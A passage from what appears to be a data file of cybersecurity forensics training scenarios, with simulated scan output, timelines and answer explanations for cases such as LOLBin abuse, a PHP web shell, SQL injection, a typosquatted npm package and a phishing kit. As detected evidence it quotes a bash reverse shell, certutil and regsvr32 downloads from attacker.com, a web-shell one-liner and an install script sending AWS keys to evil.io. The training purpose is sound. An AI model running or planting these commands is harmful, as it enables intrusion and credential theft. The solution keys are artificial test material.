        kw: "DNS TXT queries with Base64-encoded subdomains (aGVsbG8=) averaging 220 characters each — normal DNS queries are under 30 characters. The attacker used a DNS tunneling tool to exfiltrate data through an allowed protocol.",
        ts: "All 4,847 anomalous queries occurred between 1 AM and 4 AM — a quiet window to exfiltrate slowly enough to avoid volume-based alerting.",
      },
    },
  },
  {
    id: "12",
    title: "TOR Exit Node",
    category: "network",
    difficulty: "INTERMEDIATE",
    scenario: "Proxy logs show HTTPS traffic going to IP addresses that are listed in the TOR exit node directory. An employee's workstation is routing communications through the TOR network. Investigate.",
    files: [
      {
        name: "proxy_access.log",
        risk: "HIGH",
        declared_type: "Log File",
        actual_type: "Log File with TOR Traffic",
        risk_score: 87,
        hash: "c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: proxy_access.log",
          "[!] TOR EXIT NODE MATCH: 62.102.148.67 found in TOR exit node list",
          "[!] TOR EXIT NODE MATCH: 185.220.101.33 found in TOR exit node list",
          "[!] TOR EXIT NODE MATCH: 109.70.100.28 found in TOR exit node list",
          "[!] KEYWORD MATCH: CONNECT tunnel to .onion domain proxy",
          "[!] VOLUME: 890 MB transferred via TOR in 4 hours",
          "[!] TIMESTAMP: TOR traffic 2024-11-05 20:00:00 to 00:00:00 (evening)",
          "[*] Scan complete — TOR EXFILTRATION DETECTED",
        ],
        tags: ["TOR", "ONION", "EXIT NODE", "HTTPS TUNNEL"],
      },
    ],
    timeline: [
      { time: "20:00:00", event: "TOR circuit established", severity: "HIGH", detail: "Workstation connected to TOR network via known exit nodes" },
      { time: "20:01:00", event: "Data exfiltration", severity: "HIGH", detail: "890 MB sent to .onion address via TOR" },
    ],
    network_log: {
      connections: [
        { dst_ip: "62.102.148.67", dst_port: 443, protocol: "TCP", country: "Germany (TOR Exit)", bytes: 933232640, suspicious: true, label: "TOR Exit Node" },
        { dst_ip: "185.220.101.33", dst_port: 9001, protocol: "TCP", country: "Germany (TOR)", bytes: 145000, suspicious: true, label: "TOR Node" },
      ],
      dns_queries: [
        { query: "torproject.org", type: "A", suspicious: false },
      ],
      stats: { total: 12, suspicious: 10, exfiltrated_mb: 890 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
        kw: "Multiple destination IPs match published TOR exit node lists, and CONNECT tunnels to .onion domains confirm TOR is being used — making the exfiltration destination untraceable.",
        ts: "890 MB transferred during evening hours (8 PM – midnight) — chosen to blend with end-of-day user activity but still outside normal business patterns.",
      },
    },
  },
  {
    id: "13",
    title: "Living Off the Land",
    category: "network",
    difficulty: "ADVANCED",
    scenario: "An advanced attacker left no malware files. Instead, they used Windows built-in tools to move laterally and exfiltrate data. Only event logs remain. Reconstruct the attack using LOLBins.",
    files: [
      {
        name: "windows_event_4688.log",
        risk: "HIGH",
        declared_type: "Windows Event Log",
        actual_type: "Event Log with LOLBin Attack Chain",
        risk_score: 93,
        hash: "d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: windows_event_4688.log",
          "[*] Analyzing process creation events...",
          "[!] LOLBin CHAIN DETECTED:",
          "[!] certutil.exe -urlcache -f http://attacker.com/payload.b64 — download via certutil",
          "[!] certutil.exe -decode payload.b64 payload.exe — decode base64",
          "[!] regsvr32.exe /s /n /u /i:http://attacker.com/file.sct scrobj.dll — regsvr32 bypass",
          "[!] powershell -enc [base64] — encoded command execution",
          "[!] wmic process call create 'cmd.exe /c...' — WMIC process spawning",
          "[!] TIMESTAMP: Chain executed 2024-12-01 02:00:00 to 02:15:00",
          "[*] Scan complete — LOTL ATTACK IDENTIFIED",
        ],
        tags: ["LOLBIN", "CERTUTIL", "REGSVR32", "WMIC", "POWERSHELL", "NO MALWARE FILES"],
      },
    ],
    timeline: [
      { time: "02:00:00", event: "certutil download", severity: "HIGH", detail: "certutil.exe used to download and decode Base64 payload" },
      { time: "02:05:00", event: "regsvr32 bypass", severity: "HIGH", detail: "Script execution via regsvr32 AppLocker bypass" },
      { time: "02:10:00", event: "Lateral movement", severity: "HIGH", detail: "wmic spawned cmd.exe on remote hosts" },
      { time: "02:15:00", event: "Exfiltration", severity: "HIGH", detail: "PowerShell sent data to external endpoint" },
    ],
    network_log: {
      connections: [
        { dst_ip: "198.51.100.22", dst_port: 443, protocol: "TCP", country: "USA", bytes: 2345000, suspicious: true, label: "LOLBin Exfil" },
      ],
      dns_queries: [
        { query: "legitimate-looking-cdn.com", type: "A", suspicious: true },
      ],
      stats: { total: 8, suspicious: 6, exfiltrated_mb: 2.2 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
        kw: "The attack chain uses only Windows built-in tools: certutil (download/decode), regsvr32 (AppLocker bypass), WMIC (remote execution), and PowerShell (exfiltration) — no malware files needed.",
        ts: "The entire 15-minute attack chain executed between 2:00–2:15 AM, minimizing detection window while maximizing speed of compromise.",
      },
    },
  },
  {
    id: "14",
    title: "The Leaky USB",
    category: "insider",
    difficulty: "BEGINNER",
    scenario: "A pharmaceutical company noticed a large amount of R&D files copied to a USB drive. Physical badge logs show after-hours access. A disgruntled employee is suspected. Investigate the artifacts.",
    files: [
      {
        name: "usb_device_log.txt",
        risk: "HIGH",
        declared_type: "Log File",
        actual_type: "USB Insertion/File Copy Log",
        risk_score: 82,
        hash: "e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: usb_device_log.txt",
          "[!] USB INSERTION: SanDisk Ultra 128GB at 23:07:14",
          "[!] FILE COPIES DETECTED: 847 files copied to E:\\",
          "[!] KEYWORD MATCH: 'formula_', 'clinical_trial_', 'patent_' — IP files copied",
          "[!] VOLUME: 4.2 GB copied in 23 minutes",
          "[!] TIMESTAMP: 11:07 PM — after business hours",
          "[!] USER: jsmith (on PIP — performance improvement plan)",
          "[!] BADGE LOG MATCH: J.Smith badged in at Building C 22:58 (confirmed physical access)",
          "[*] Scan complete — INSIDER THREAT INDICATORS DETECTED",
        ],
        tags: ["USB", "DATA THEFT", "AFTER HOURS", "INSIDER THREAT"],
      },
    ],
    timeline: [
      { time: "22:58:00", event: "Badge swipe", severity: "MED", detail: "J.Smith accessed Building C at 10:58 PM" },
      { time: "23:07:14", event: "USB inserted", severity: "HIGH", detail: "128GB USB drive plugged into R&D workstation" },
      { time: "23:30:22", event: "USB removed", severity: "HIGH", detail: "847 files (4.2 GB) copied before device removed" },
    ],
    network_log: {
      connections: [],
      dns_queries: [],
      stats: { total: 0, suspicious: 0, exfiltrated_mb: 0 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
        kw: "Log entries show 847 files with names containing 'formula_', 'clinical_trial_', and 'patent_' copied to a USB drive — clearly targeted theft of intellectual property rather than accidental copying.",
        ts: "The USB was inserted at 11:07 PM — well after business hours — and badge logs confirm the employee physically accessed the building at 10:58 PM specifically for this purpose.",
      },
    },
  },
  {
    id: "15",
    title: "The Email Dump",
    category: "insider",
    difficulty: "INTERMEDIATE",
    scenario: "A sales director is leaving for a competitor. Before departing, their email account exported the entire company mailbox as a PST file and sent it via personal Gmail. Investigate the mail server logs.",
    files: [
      {
        name: "exchange_audit.log",
        risk: "HIGH",
        declared_type: "Exchange Audit Log",
        actual_type: "Log with PST Export and Webmail Exfil",
        risk_score: 90,
        hash: "f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: exchange_audit.log",
          "[!] PST EXPORT: New-MailboxExportRequest executed for user mkumar",
          "[!] EXPORT SIZE: 8.7 GB PST file created: mailbox_full_export.pst",
          "[!] KEYWORD MATCH: 'New-MailboxExportRequest' — admin-level mailbox export",
          "[!] KEYWORD MATCH: 'Send-As' permission self-granted before export",
          "[!] WEBMAIL ACCESS: 8.7 GB uploaded to mail.google.com from corporate network",
          "[!] TIMESTAMP: Export 2025-01-10 18:45:00 (after notice period started)",
          "[!] RECIPIENT: personal email mkumar.personal@gmail.com",
          "[*] Scan complete — DATA EXFILTRATION VIA EMAIL CONFIRMED",
        ],
        tags: ["PST EXPORT", "MAILBOX DUMP", "GMAIL UPLOAD", "INSIDER"],
      },
    ],
    timeline: [
      { time: "18:45:00", event: "PST export", severity: "HIGH", detail: "Full mailbox exported to PST after resignation notice" },
      { time: "19:22:00", event: "Gmail upload", severity: "HIGH", detail: "8.7 GB PST file sent to personal Gmail from corporate network" },
    ],
    network_log: {
      connections: [
        { dst_ip: "142.250.185.69", dst_port: 443, protocol: "TCP", country: "USA (Google)", bytes: 9341153280, suspicious: true, label: "Gmail Upload (8.7 GB)" },
      ],
      dns_queries: [
        { query: "mail.google.com", type: "A", suspicious: false },
      ],
      stats: { total: 4, suspicious: 2, exfiltrated_mb: 8700 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
        kw: "New-MailboxExportRequest is an Exchange PowerShell command requiring admin rights — the user either had admin access or escalated privileges to export their entire mailbox, then uploaded it to personal Gmail.",
        ts: "The export occurred at 6:45 PM on the day after submitting a resignation notice — timing that strongly suggests deliberate data theft before departure.",
      },
    },
  },
  {
    id: "16",
    title: "The Credential Harvest",
    category: "insider",
    difficulty: "ADVANCED",
    scenario: "A privileged user dumped LSASS credentials and used pass-the-hash to move laterally to the finance server. Investigate the memory artifacts and security event logs showing the credential theft chain.",
    files: [
      {
        name: "lsass.dmp",
        risk: "HIGH",
        declared_type: "Memory Dump",
        actual_type: "LSASS Memory Dump (Credential Theft)",
        risk_score: 99,
        hash: "a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
        findings: ["kw", "hash", "ts"],
        terminal_lines: [
          "[*] Scanning: lsass.dmp",
          "[!] LSASS DUMP DETECTED: This is a dump of the Local Security Authority process",
          "[!] CREDENTIAL HASHES EXTRACTED: 14 NTLM hashes recoverable",
          "[!] KEYWORD MATCH: Mimikatz output pattern detected in dump metadata",
          "[!] KEYWORD MATCH: 'sekurlsa::logonpasswords' — credential dumping command",
          "[!] DOMAIN ADMIN HASH: Administrator NTLM hash present",
          "[!] TIMESTAMP: Dump created 2025-02-14 03:30:00",
          "[!] HASH MATCH: Dump signature matches Mimikatz procdump output",
          "[*] Scan complete — CRITICAL — CREDENTIAL THEFT CONFIRMED",
        ],
        tags: ["LSASS DUMP", "MIMIKATZ", "NTLM HASH", "CREDENTIAL THEFT"],
      },
    ],
    timeline: [
      { time: "03:30:00", event: "LSASS dumped", severity: "HIGH", detail: "procdump.exe captured LSASS memory — 14 NTLM hashes extracted" },
      { time: "03:35:00", event: "Pass-the-hash", severity: "HIGH", detail: "Domain admin NTLM hash used to authenticate to finance server" },
      { time: "03:37:00", event: "Finance server accessed", severity: "HIGH", detail: "Lateral movement successful — financial records accessed" },
    ],
    network_log: {
      connections: [
        { dst_ip: "10.0.1.50", dst_port: 445, protocol: "TCP", country: "Internal (Finance Server)", bytes: 145000000, suspicious: true, label: "SMB Lateral Movement" },
      ],
      dns_queries: [],
      stats: { total: 3, suspicious: 2, exfiltrated_mb: 138 },
    },
    solution: {
      findings: ["kw", "hash", "ts"],
      explanations: {
        kw: "The dump contains Mimikatz output patterns and the 'sekurlsa::logonpasswords' command signature — Mimikatz is the most common credential dumping tool, used here to extract NTLM hashes from LSASS memory.",
        hash: "The file matches known Mimikatz procdump output signatures in the threat database — confirming the specific tool used.",
        ts: "LSASS was dumped at 3:30 AM — credential theft always happens at off-hours to avoid detection before lateral movement.",
      },
    },
  },
  {
    id: "17",
    title: "The Web Shell",
    category: "web",
    difficulty: "BEGINNER",
    scenario: "A web server's access logs show someone browsing to an unusual PHP file in the upload directory. The file was not part of the original application. Investigate the web shell artifact.",
    files: [
      {
        name: "uploads/shell.php",
        risk: "HIGH",
        declared_type: "PHP File",
        actual_type: "PHP Web Shell",
        risk_score: 99,
        hash: "b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: uploads/shell.php",
          "[!] WEB SHELL DETECTED",
          "[!] KEYWORD MATCH: '<?php system($_GET[\"cmd\"]); ?>'",
          "[!] KEYWORD MATCH: 'eval(base64_decode' — obfuscated code execution",
          "[!] KEYWORD MATCH: '$_FILES', '$_POST', '$_GET' — all input vectors used",
          "[!] KEYWORD MATCH: 'passthru', 'exec', 'shell_exec' — OS command execution",
          "[!] TIMESTAMP: Uploaded 2025-03-01 16:22:14 via HTTP POST to /upload.php",
          "[!] SERVER LOG: GET /uploads/shell.php?cmd=whoami — executed by attacker",
          "[*] Scan complete — WEB SHELL CONFIRMED",
        ],
        tags: ["WEB SHELL", "PHP", "SYSTEM EXEC", "FILE UPLOAD VULN"],
      },
    ],
    timeline: [
      { time: "16:22:14", event: "Web shell uploaded", severity: "HIGH", detail: "PHP shell uploaded via vulnerable file upload endpoint" },
      { time: "16:23:01", event: "Command execution", severity: "HIGH", detail: "Attacker executed 'whoami', 'id', 'cat /etc/passwd' via GET parameter" },
      { time: "16:45:00", event: "Reverse shell", severity: "HIGH", detail: "bash -i >& /dev/tcp/attacker.com/9001 0>&1 executed" },
    ],
    network_log: {
      connections: [
        { dst_ip: "198.51.100.10", dst_port: 9001, protocol: "TCP", country: "USA", bytes: 345000, suspicious: true, label: "Reverse Shell" },
      ],
      dns_queries: [
        { query: "attacker-server.com", type: "A", suspicious: true },
      ],
      stats: { total: 3, suspicious: 2, exfiltrated_mb: 0.3 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
        kw: "The PHP file contains classic web shell code: system($_GET['cmd']) executes OS commands via URL parameters. Also uses eval(base64_decode()) for obfuscation and passthru/exec for alternative execution paths.",
        ts: "The file was uploaded at 4:22 PM via HTTP POST and first accessed at 4:23 PM — the near-immediate access confirms the attacker was actively present, not a bot.",
      },
    },
  },
  {
    id: "18",
    title: "The SQL Injection",
    category: "web",
    difficulty: "INTERMEDIATE",
    scenario: "A retail site's database was dumped by an attacker. Web application firewall logs show unusual query strings in URL parameters. Investigate the attack payload and what data was stolen.",
    files: [
      {
        name: "waf_blocked_requests.log",
        risk: "HIGH",
        declared_type: "WAF Log",
        actual_type: "WAF Log with SQL Injection Attacks",
        risk_score: 91,
        hash: "c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
        findings: ["kw", "ts"],
        terminal_lines: [
          "[*] Scanning: waf_blocked_requests.log",
          "[*] Analyzing request patterns...",
          "[!] SQL INJECTION DETECTED — Blind Boolean-based",
          "[!] KEYWORD MATCH: '1 AND 1=1' in product_id parameter",
          "[!] KEYWORD MATCH: 'UNION SELECT NULL,NULL,NULL--'",
          "[!] KEYWORD MATCH: 'SLEEP(5)' — time-based blind SQLi",
          "[!] KEYWORD MATCH: 'information_schema.tables' — DB enumeration",
          "[!] AUTOMATION: 12,400 requests in 47 minutes — sqlmap signature",
          "[!] TIMESTAMP: Attack 2025-04-01 02:00:00 (3 AM — automated)",
          "[!] DATA RETURNED: 'customers' table dumped — 82,000 records",
          "[*] Scan complete — SQL INJECTION CONFIRMED",
        ],
        tags: ["SQLI", "UNION SELECT", "SQLMAP", "DB DUMP", "82K RECORDS"],
      },
    ],
    timeline: [
      { time: "02:00:00", event: "SQLi started", severity: "HIGH", detail: "Automated tool (sqlmap) began injecting into product_id parameter" },
      { time: "02:47:00", event: "Database dumped", severity: "HIGH", detail: "82,000 customer records including emails and hashed passwords extracted" },
    ],
    network_log: {
      connections: [
        { dst_ip: "185.100.65.12", dst_port: 80, protocol: "TCP", country: "Netherlands", bytes: 89400000, suspicious: true, label: "DB Exfil via HTTP Response" },
      ],
      dns_queries: [],
      stats: { total: 12400, suspicious: 12400, exfiltrated_mb: 85 },
    },
    solution: {
      findings: ["kw", "ts"],
      explanations: {
        kw: "WAF logs show textbook SQL injection payloads: UNION SELECT for data extraction, information_schema enumeration, and SLEEP() for time-based blind injection — all classic sqlmap signatures.",
        ts: "12,400 requests in 47 minutes at 2 AM is unmistakably automated — sqlmap's default rate and timing pattern, not a human manually testing.",
      },
    },
  },
  {
    id: "19",
    title: "The Supply Chain",
    category: "web",
    difficulty: "ADVANCED",
    scenario: "A malicious npm package was published to the registry mimicking a popular utility. When developers ran 'npm install', the postinstall script executed malicious code. Investigate the package.",
    files: [
      {
        name: "package.json",
        risk: "HIGH",
        declared_type: "NPM Package Manifest",
        actual_type: "Malicious NPM Package",
        risk_score: 96,
        hash: "d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
        findings: ["kw", "ts", "hash"],
        terminal_lines: [
          "[*] Scanning: package.json",
          "[!] TYPOSQUATTING DETECTED: Package 'lodahs' mimics 'lodash' (missing 's')",
          "[!] KEYWORD MATCH: 'postinstall': 'node ./install.js' — runs on npm install",
          "[!] install.js ANALYSIS:",
          "[!]   require('https').get('https://evil.io/payload') — downloads payload",
          "[!]   process.env access — reads all environment variables",
          "[!]   Sends AWS_ACCESS_KEY_ID, AWS_SECRET to attacker",
          "[!] TIMESTAMP: Published 2025-04-15 — 2 days after lodash 4.17.22 release",
          "[!] HASH MATCH: install.js matches known supply chain attack template",
          "[*] Scan complete — SUPPLY CHAIN ATTACK CONFIRMED",
        ],
        tags: ["TYPOSQUATTING", "POSTINSTALL", "ENV VARS", "AWS CREDS", "SUPPLY CHAIN"],
      },
    ],
    timeline: [
      { time: "T+0s", event: "npm install run", severity: "HIGH", detail: "Developer ran 'npm install lodahs' (typo)" },
      { time: "T+1s", event: "postinstall triggered", severity: "HIGH", detail: "install.js executed automatically during package install" },
      { time: "T+2s", event: "Creds stolen", severity: "HIGH", detail: "AWS_ACCESS_KEY_ID and secret sent to evil.io" },
    ],
    network_log: {
      connections: [
        { dst_ip: "104.18.0.100", dst_port: 443, protocol: "TCP", country: "USA (Cloudflare)", bytes: 2048, suspicious: true, label: "Credential Exfil to evil.io" },
      ],
      dns_queries: [
        { query: "evil.io", type: "A", suspicious: true },
      ],
      stats: { total: 2, suspicious: 2, exfiltrated_mb: 0.001 },
    },
    solution: {
      findings: ["kw", "ts", "hash"],
      explanations: {
        kw: "The package uses a postinstall hook to automatically run code on npm install. install.js reads all environment variables (including cloud credentials) and sends them to an attacker's server — classic supply chain credential theft.",
        ts: "The malicious package was published exactly 2 days after lodash 4.17.22 was released — attackers monitor popular packages and immediately publish typosquats to catch developers who mistype.",
        hash: "install.js matches a known supply chain attack template in the threat database — the same code skeleton has been used in multiple npm supply chain attacks.",
      },
    },
  },
  {
    id: "20",
    title: "The Phishing Kit",
    category: "web",
    difficulty: "ADVANCED",
    scenario: "Employees are reporting that the corporate login page looks 'off'. Investigation reveals a cloned version of the login portal on an attacker-controlled domain, harvesting credentials. Analyze the kit.",
    files: [
      {
        name: "phishing_kit.zip",
        risk: "HIGH",
        declared_type: "ZIP Archive",
        actual_type: "Phishing Kit (Corporate Clone)",
        risk_score: 93,
        hash: "e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4",
        findings: ["kw", "hash", "ts"],
        terminal_lines: [
          "[*] Scanning: phishing_kit.zip",
          "[*] Extracting and analyzing kit...",
          "[!] CREDENTIAL HARVESTING: index.php POSTs to mailer.php",
          "[!] KEYWORD MATCH: '$_POST[\"username\"], $_POST[\"password\"]' — captures creds",
          "[!] KEYWORD MATCH: 'mail(\"attacker@protonmail.com\", ...)' — emails stolen creds",
          "[!] KEYWORD MATCH: 'header(\"Location: https://real-corp-login.com\")' — redirects victim",
          "[!] CORPORATE CLONE: HTML/CSS exactly matches target company's login page",
          "[!] TIMESTAMP: Kit assembled 2025-04-20 (3 days before phishing campaign)",
          "[!] HASH MATCH: Kit matches known PhaaS (Phishing-as-a-Service) template",
          "[*] Scan complete — PHISHING KIT CONFIRMED",
        ],
        tags: ["PHISHING KIT", "CREDENTIAL HARVEST", "REDIRECT", "PHAAS", "CORPORATE CLONE"],
      },
    ],
    timeline: [
      { time: "2025-04-20", event: "Kit deployed", severity: "HIGH", detail: "Phishing site went live at corp-l0gin.com (zero instead of 'o')" },
      { time: "2025-04-23", event: "Phishing emails sent", severity: "HIGH", detail: "3,200 targeted emails sent to company employees" },
      { time: "2025-04-23T09:15:00", event: "First victim", severity: "HIGH", detail: "Credentials captured and emailed to attacker's ProtonMail" },
    ],
    network_log: {
      connections: [
        { dst_ip: "185.199.110.153", dst_port: 443, protocol: "TCP", country: "USA", bytes: 45000, suspicious: true, label: "Creds → ProtonMail" },
      ],
      dns_queries: [
        { query: "corp-l0gin.com", type: "A", suspicious: true },
      ],
      stats: { total: 5, suspicious: 4, exfiltrated_mb: 0.04 },
    },
    solution: {
      findings: ["kw", "hash", "ts"],
      explanations: {
        kw: "The kit captures username/password via POST, emails them to an attacker's ProtonMail, and redirects the victim to the real login page — the victim often doesn't realize they were phished.",
        hash: "The kit matches a known Phishing-as-a-Service (PhaaS) template — attackers can purchase these kits with corporate clones pre-built, lowering the skill barrier.",
        ts: "Kit was deployed 3 days before the phishing campaign — preparation time used to test redirects and ensure the clone looked authentic before mass-emailing employees.",
      },
    },
  },
];
